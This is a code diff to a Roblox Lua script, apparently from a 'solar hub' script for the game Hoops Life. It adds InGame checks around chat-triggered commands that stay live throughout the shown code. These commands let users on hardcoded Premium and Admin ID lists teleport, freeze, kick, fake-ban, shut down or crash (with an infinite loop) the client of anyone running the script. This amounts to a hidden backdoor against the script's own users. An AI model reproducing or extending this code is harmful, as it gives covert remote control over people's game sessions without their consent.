@@ -74,27 +74,39 @@ if table.find(List.Premium, game.Players.LocalPlayer.UserId) or table.find(List.
     game.TextChatService.MessageReceived:Connect(function(message)
         local text = message.Text
         local id = message.TextSource.UserId
-        if table.find(List.Premium, id) or table.find(List.Admin, id) and game.Players.LocalPlayer.Values.InGame == false then
+        if table.find(List.Premium, id) or table.find(List.Admin, id) then
             if text == "!bring" then
+if game.Players.LocalPlayer.Values.InGame == false then
                 for i, v in pairs(game.Players:GetPlayers()) do
                     if v.UserId == id and v.Character then
                         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
                     end
                 end
+end
             elseif text == "!freeze" then
+if game.Players.LocalPlayer.Values.InGame == false then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+end
             elseif text == "!unfreeze" then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
             elseif text == "!check" then
                 game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("like and subscribe to solar hub 😁")
             elseif text == "!kick" then
+if game.Players.LocalPlayer.Values.InGame == false then
                 game.Players.LocalPlayer:Kick("kicked by "..tostring(message.TextSource))
+end
             elseif text == "!fakeban" then
+if game.Players.LocalPlayer.Values.InGame == false then
                 game.Players.LocalPlayer:Kick("YOU HAVE BEEN PERMANENTLY BANNED FROM HOOPS LIFE !")
+end
             elseif text == "!close" then
+if game.Players.LocalPlayer.Values.InGame == false then
                 game:Shutdown()
+end
             elseif text == "!crash" then
+if game.Players.LocalPlayer.Values.InGame == false then
                 while true do end
+end
             end
         end
     end)
